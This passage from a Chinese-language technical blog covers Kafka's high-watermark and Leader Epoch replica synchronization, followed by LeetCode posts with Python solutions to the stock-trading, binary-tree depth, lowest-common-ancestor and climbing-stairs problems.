<p>1.写入消息到本地磁盘。</p>
<p>2.更新分区高水位值。</p>
<ul>
<li>i. 获取 Leader 副本所在 Broker 端保存的所有远程副本 LEO 值（LEO-1，LEO-2，……，LEO-n）。</li>
<li>ii. 获取 Leader 副本高水位值：currentHW。</li>
<li>iii. 更新 currentHW = max{currentHW, min（LEO-1, LEO-2, ……，LEO-n）}。</li>
</ul>
<p>处理 Follower 副本拉取消息的逻辑如下：</p>
<p>1.读取磁盘（或页缓存）中的消息数据。</p>
<p>2.使用 Follower 副本发送请求中的位移值更新远程副本 LEO 值。</p>
<p>3.更新分区高水位值（具体步骤与处理生产者请求的步骤相同）。</p>
<h5 id="Follower-副本"><a href="#Follower-副本" class="headerlink" title="Follower 副本"></a>Follower 副本</h5><p>从 Leader 拉取消息的处理逻辑如下：</p>
<p>1.写入消息到本地磁盘。</p>
<p>2.更新 LEO 值。</p>
<p>3.更新高水位值。</p>
<ul>
<li>i. 获取 Leader 发送的高水位值：currentHW。</li>
<li>ii. 获取步骤 2 中更新过的 LEO 值：currentLEO。</li>
<li>iii. 更新高水位为 min(currentHW, currentLEO)。</li>
</ul>
<h4 id="副本同步机制解析"><a href="#副本同步机制解析" class="headerlink" title="副本同步机制解析"></a>副本同步机制解析</h4><p><img src="https://static001.geekbang.org/resource/image/1e/36/1ee643ce819a503f72df3d9b4ab04536.jpg"></p>
<p><img src="https://static001.geekbang.org/resource/image/73/0b/7317242d7068dbf618866d5974a2d80b.jpg"></p>
<p><img src="https://static001.geekbang.org/resource/image/91/0d/910e114abe40f1f9e4a13f6e6083320d.jpg"></p>
<p><img src="https://static001.geekbang.org/resource/image/80/cb/8066e72733f14d2732a054ed56e373cb.jpg"></p>
<h4 id="Leader-Epoch-登场"><a href="#Leader-Epoch-登场" class="headerlink" title="Leader Epoch 登场"></a>Leader Epoch 登场</h4><p>从刚才的分析中，我们知道，Follower 副本的高水位更新需要一轮额外的拉取请求才能实现。如果把上面那个例子扩展到多个 Follower 副本，情况可能更糟，也许需要多轮拉取请求。也就是说，Leader 副本高水位更新和 Follower 副本高水位更新在时间上是存在错配的。这种错配是很多“数据丢失”或“数据不一致”问题的根源。</p>
<p>所谓 Leader Epoch，我们大致可以认为是 Leader 版本。它由两部分数据组成。</p>
<ul>
<li>Epoch。一个单调增加的版本号。每当副本领导权发生变更时，都会增加该版本号。小版本号的 Leader 被认为是过期 Leader，不能再行使 Leader 权力。</li>
<li>起始位移（Start Offset）。Leader 副本在该 Epoch 值上写入的首条消息的位移。</li>
</ul>
<p>Kafka Broker 会在内存中为每个分区都缓存 Leader Epoch 数据，同时它还会定期地将这些信息持久化到一个 checkpoint 文件中。当 Leader 副本写入消息到磁盘时，Broker 会尝试更新这部分缓存。如果该 Leader 是首次写入消息，那么 Broker 会向缓存中增加一个 Leader Epoch 条目，否则就不做更新。这样，每次有 Leader 变更时，新的 Leader 副本会查询这部分缓存，取出对应的 Leader Epoch 的起始位移，以避免数据丢失和不一致的情况。</p>
<p><img src="https://static001.geekbang.org/resource/image/4d/f5/4d97a873fc1bfaf89b5cc8259838f0f5.jpg"></p>
<p>我稍微解释一下，单纯依赖高水位是怎么造成数据丢失的。开始时，副本 A 和副本 B 都处于正常状态，A 是 Leader 副本。某个使用了默认 acks 设置的生产者程序向 A 发送了两条消息，A 全部写入成功，此时 Kafka 会通知生产者说两条消息全部发送成功。</p>
<p>现在我们假设 Leader 和 Follower 都写入了这两条消息，而且 Leader 副本的高水位也已经更新了，但 Follower 副本高水位还未更新——这是可能出现的。还记得吧，Follower 端高水位的更新与 Leader 端有时间错配。倘若此时副本 B 所在的 Broker 宕机，当它重启回来后，副本 B 会执行日志截断操作，将 LEO 值调整为之前的高水位值，也就是 1。这就是说，位移值为 1 的那条消息被副本 B 从磁盘中删除，此时副本 B 的底层磁盘文件中只保存有 1 条消息，即位移值为 0 的那条消息。</p>
<p>当执行完截断操作后，副本 B 开始从 A 拉取消息，执行正常的消息同步。如果就在这个节骨眼上，副本 A 所在的 Broker 宕机了，那么 Kafka 就别无选择，只能让副本 B 成为新的 Leader，此时，当 A 回来后，需要执行相同的日志截断操作，即将高水位调整为与 B 相同的值，也就是 1。这样操作之后，位移值为 1 的那条消息就从这两个副本中被永远地抹掉了。这就是这张图要展示的数据丢失场景。</p>
<p>严格来说，这个场景发生的前提是 Broker 端参数 min.insync.replicas 设置为 1。此时一旦消息被写入到 Leader 副本的磁盘，就会被认为是“已提交状态”，但现有的时间错配问题导致 Follower 端的高水位更新是有滞后的。如果在这个短暂的滞后时间窗口内，接连发生 Broker 宕机，那么这类数据的丢失就是不可避免的。</p>
<p><img src="https://static001.geekbang.org/resource/image/3a/8c/3a2e1131e8244233c076de906c174f8c.jpg"></p>
<p>场景和之前大致是类似的，只不过引用 Leader Epoch 机制后，Follower 副本 B 重启回来后，需要向 A 发送一个特殊的请求去获取 Leader 的 LEO 值。在这个例子中，该值为 2。当获知到 Leader LEO=2 后，B 发现该 LEO 值不比它自己的 LEO 值小，而且缓存中也没有保存任何起始位移值 &gt; 2 的 Epoch 条目，因此 B 无需执行任何日志截断操作。这是对高水位机制的一个明显改进，即副本是否执行日志截断不再依赖于高水位进行判断。</p>
<p>现在，副本 A 宕机了，B 成为 Leader。同样地，当 A 重启回来后，执行与 B 相同的逻辑判断，发现也不用执行日志截断，至此位移值为 1 的那条消息在两个副本中均得到保留。后面当生产者程序向 B 写入新消息时，副本 B 所在的 Broker 缓存中，会生成新的 Leader Epoch 条目：[Epoch=1, Offset=2]。之后，副本 B 会使用这个条目帮助判断后续是否执行日志截断操作。这样，通过 Leader Epoch 机制，Kafka 完美地规避了这种数据丢失场景。</p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_买股票的最佳时机</title>
    <url>/2019/02/08/leetcode-%E4%B9%B0%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA/</url>
    <content><![CDATA[<p>题目名称深深地吸引了我</p>
<span id="more"></span>

<h2 id="买股票的最佳时机1"><a href="#买股票的最佳时机1" class="headerlink" title="买股票的最佳时机1"></a>买股票的最佳时机1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<p>如果你最多只允许完成一笔交易（即买入和卖出一支股票），设计一个算法来计算你所能获取的最大利润。</p>
<p>注意你不能在买入股票前卖出股票。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [7,1,5,3,6,4]</span><br><span class="line">输出: 5</span><br><span class="line">解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span><br><span class="line">     注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [7,6,4,3,1]</span><br><span class="line">输出: 0</span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>感觉就是个遍历列表的题目，求最大差值就好</p>
<h3 id="解题—超时答案"><a href="#解题—超时答案" class="headerlink" title="解题—超时答案"></a>解题—超时答案</h3><p>自己原先写的，就用最基本的遍历写的，的确很烂，233</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        Dval = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(prices) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> Dval</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)-<span class="number">1</span>):</span><br><span class="line">            price = prices[i]</span><br><span class="line">            max_num = prices[i+<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)-i):</span><br><span class="line">                num = prices[j+i]</span><br><span class="line">                max_num = <span class="built_in">max</span>(max_num, num)</span><br><span class="line">            <span class="keyword">if</span> max_num &gt; price:</span><br><span class="line">                dval = max_num - price</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dval = <span class="number">0</span></span><br><span class="line">            Dval = <span class="built_in">max</span>(Dval, dval)</span><br><span class="line">        <span class="keyword">return</span> Dval</span><br></pre></td></tr></table></figure>

<h3 id="解题—通过答案"><a href="#解题—通过答案" class="headerlink" title="解题—通过答案"></a>解题—通过答案</h3><p>看了别人的评论，发现用了动态规划，厉害</p>
<p>动态规划：前i天的最大收益 = max{前i-1天的最大收益，第i天的价格-前i-1天中的最小价格}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        min_p, max_p = <span class="number">999999</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)):</span><br><span class="line">            min_p = <span class="built_in">min</span>(min_p, prices[i])</span><br><span class="line">            max_p = <span class="built_in">max</span>(max_p, prices[i] - min_p)</span><br><span class="line">        <span class="keyword">return</span> max_p</span><br></pre></td></tr></table></figure>

<h3 id="什么是动态规划"><a href="#什么是动态规划" class="headerlink" title="什么是动态规划"></a>什么是动态规划</h3><p>每个阶段只有一个状态-&gt;<strong>递推</strong>；<br>每个阶段的最优状态都是由上一个阶段的最优状态得到的-&gt;<strong>贪心</strong>；<br>每个阶段的最优状态是由之前所有阶段的状态的组合得到的-&gt;<strong>搜索</strong>；<br>每个阶段的最优状态可以从之前某个阶段的某个或某些状态直接得到而不管之前这个状态是如何得到的-&gt;<strong>动态规划</strong>。</p>
<h2 id="买股票的最佳时机2"><a href="#买股票的最佳时机2" class="headerlink" title="买股票的最佳时机2"></a>买股票的最佳时机2</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<p>设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。</p>
<p><strong>注意：</strong>你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [7,1,5,3,6,4]</span><br><span class="line">输出: 7</span><br><span class="line">解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。</span><br><span class="line">     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [1,2,3,4,5]</span><br><span class="line">输出: 4</span><br><span class="line">解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。</span><br><span class="line">     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。</span><br><span class="line">     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: [7,6,4,3,1]</span><br><span class="line">输出: 0</span><br><span class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>区别就是可以多此买卖，但是买前必须手头是没有股票的</p>
<p>原则就是当明天的价格比今天的价格贵的时候我们今天买，明天卖，这样能够获取最大利润</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> day <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)-<span class="number">1</span>):</span><br><span class="line">            Dval = prices[day+<span class="number">1</span>] - prices[day]</span><br><span class="line">            <span class="keyword">if</span> Dval &gt; <span class="number">0</span>:</span><br><span class="line">                profit += Dval</span><br><span class="line">        <span class="keyword">return</span> profit</span><br></pre></td></tr></table></figure>

<p>典型的贪心算法，总是做出在当前看来是最好的选择，不从整体最优上加以考虑，也就是说，只关心当前最优解</p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_二叉树相关题目(1)</title>
    <url>/2019/02/07/leetcode-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>二叉树数据结构里还挺常用的，但是都快忘记了，就来刷一下题回顾一下，顺便还能练练python</p>
<span id="more"></span>

<h2 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定一个二叉树，找出其最大深度。</p>
<p>二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。</p>
<p><strong>说明:</strong> 叶子节点是指没有子节点的节点。</p>
<p><strong>示例：</strong><br>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>

<p>返回它的最大深度 3 </p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>二叉树的深度倒还真记得是什么东西，从示例来看，貌似节点是一层一层铺上去的</p>
<h3 id="解法1—迭代"><a href="#解法1—迭代" class="headerlink" title="解法1—迭代"></a>解法1—迭代</h3><p>这种方法，写起来比较省事省心，很精巧，看代码应该看得懂，把每层的节点都当作根节点计算一次，如果读到空就将层数加1后返还</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right_height = self.maxDepth(root.right)</span><br><span class="line">            left_height = self.maxDepth(root.left)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left_height, right_height) + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="解法2—DFS"><a href="#解法2—DFS" class="headerlink" title="解法2—DFS"></a>解法2—DFS</h3><p>深度遍历算法是个啥其实我已经忘记了233，百度一下</p>
<p>深度优先遍历（DFS）；</p>
<p>1、访问指定的起始顶点；</p>
<p>2、若当前访问的顶点的邻接顶点有未被访问的，则任选一个访问之；反之，退回到最近访问过的顶点；直到与起始顶点相通的全部顶点都访问完毕；</p>
<p>3、若此时图中尚有顶点未被访问，则再选其中一个顶点作为起始顶点并访问之，转 2； 反之，遍历结束。</p>
<p>当然这是图的情况，如果是连通图的话就和二叉树有点类似了，一开始用一个list或者dict存储各个节点是否被访问过的状态是不错的选择</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span>(<span class="params">self, root</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            stack.append((<span class="number">1</span>,root))  <span class="comment"># 若根节点非空，则压入</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> stack !=[]:</span><br><span class="line">            current_depth, root = stack.pop()</span><br><span class="line">            <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                depth = <span class="built_in">max</span>(depth, current_depth)</span><br><span class="line">                stack.append((current_depth + <span class="number">1</span>, root.left))</span><br><span class="line">                stack.append((current_depth + <span class="number">1</span>, root.right))</span><br><span class="line">        <span class="keyword">return</span> depth</span><br></pre></td></tr></table></figure>

<p>因为二叉树肯定是连通的，其实就是每个节点不断地向左右衍生直到尽头，这么想像，其实和迭代也是很相似的，只不过他是把所有的深度进行比较，而迭代则是把左右节点中的最大深度选择一个大的</p>
<h2 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h2><h3 id="什么是二叉搜索树"><a href="#什么是二叉搜索树" class="headerlink" title="什么是二叉搜索树"></a>什么是二叉搜索树</h3><p>一开始看到这个名字有点懵，查了下概念，逐渐有了印象</p>
<p>二叉搜索树，又称二叉排序树。它或者是一棵空树，或者是具有下列性质的二叉树： 若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉搜索树。</p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p>
<p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/binarysearchtree_improved.png" alt="img"></p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8</span><br><span class="line">输出: 6 </span><br><span class="line">解释: 节点 2 和节点 8 的最近公共祖先是 6。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4</span><br><span class="line">输出: 2</span><br><span class="line">解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

<p><strong>说明:</strong></p>
<ul>
<li>所有节点的值都是唯一的。</li>
<li>p、q 为不同节点且均存在于给定的二叉搜索树中。</li>
</ul>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>好在说明里说了节点是唯一的，也比较贴近生活，生活中完完全全一样的东西肯定还是少的，但肯定也有局限性，统计数字之类就不是很好办，比如考试同分，但这就不满足儿茶搜索树的定义了，反正先把简单的弄懂再说</p>
<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span>(<span class="params">self, root, p, q</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> q.val &gt;= root.val &gt;= p.val <span class="keyword">or</span> q.val &lt;= root.val &lt;=p.val:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">elif</span> q.val &gt; root.val <span class="keyword">and</span> p.val &gt; root.val:</span><br><span class="line">            <span class="keyword">return</span> self.lowestCommonAncestor(root.right,p,q)</span><br><span class="line">        <span class="keyword">elif</span> q.val &lt; root.val <span class="keyword">and</span> p.val &lt; root.val:</span><br><span class="line">            <span class="keyword">return</span> self.lowestCommonAncestor(root.left,p,q)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>其实理解了最基本的迭代的话还是比较轻松的，目的就是不断地把输入的p，q两个节点放在某一个节点的两侧，达成这个目的就好，函数内部调用自身不要忘记self就好</p>
<h2 id="二叉树的最近公共祖先"><a href="#二叉树的最近公共祖先" class="headerlink" title="二叉树的最近公共祖先"></a>二叉树的最近公共祖先</h2><p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p>
<p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（<strong>一个节点也可以是它自己的祖先</strong>）。”</p>
<p>例如，给定如下二叉树:  root = [3,5,1,6,2,0,8,null,null,7,4]</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/binarytree.png" alt="img"></p>
<p><strong>示例 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1</span><br><span class="line">输出: 3</span><br><span class="line">解释: 节点 5 和节点 1 的最近公共祖先是节点 3。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4</span><br><span class="line">输出: 5</span><br><span class="line">解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。</span><br></pre></td></tr></table></figure>

<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>没有排序，不能无脑迭代了，要稍微想一想，题目难度从简单一下变成了中等，中等难度的，不看答案的话，目前而言我写不出正确以及优雅的代码，难受</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span>(<span class="params">self, root, p, q</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root <span class="keyword">or</span> p == root <span class="keyword">or</span> q == root:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        left = self.lowestCommonAncestor(root.left, p, q)</span><br><span class="line">        right = self.lowestCommonAncestor(root.right, p, q)</span><br><span class="line">        <span class="keyword">if</span> left == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> right</span><br><span class="line">        <span class="keyword">if</span> right == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> left</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>

<p>这个迭代比上一个感觉难理解一些，大概就是遍历，如果返还的左右子树都有值，那么最近公共祖先就在根节点上，但如果有一边的子树没有返回值，那最近祖先就一定在另一边的子树上</p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode_爬楼梯</title>
    <url>/2019/02/10/leetcode-%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    <content><![CDATA[<p>爬呀爬~</p>
<span id="more"></span>

<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设你正在爬楼梯。需要 <em>n</em> 阶你才能到达楼顶。</p>
<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<p><strong>注意：</strong>给定 <em>n</em> 是一个正整数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入： 2</span><br><span class="line">输出： 2</span><br><span class="line">解释： 有两种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶</span><br><span class="line">2.  2 阶</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入： 3</span><br><span class="line">输出： 3</span><br><span class="line">解释： 有三种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶 + 1 阶</span><br><span class="line">2.  1 阶 + 2 阶</span><br><span class="line">3.  2 阶 + 1 阶</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有点像排列组合的题目，但还真不知道python怎么写，感觉把P和C的具体公式写出来就好，一些大神直接联想到了斐波那契数列，佩服佩服，不过想从实际问题的角度去考虑一下，我们从动态规划的角度考虑（几天前刚了解233……），第 i 个楼梯可以从第 i-1 和 i-2 个楼梯再走一步到达，走到第 i 个楼梯的方法数为走到第 i-1 和第 i-2 个楼梯的方法数之和，这么一想，欸，的确是斐波那契数列，明了多了</p>
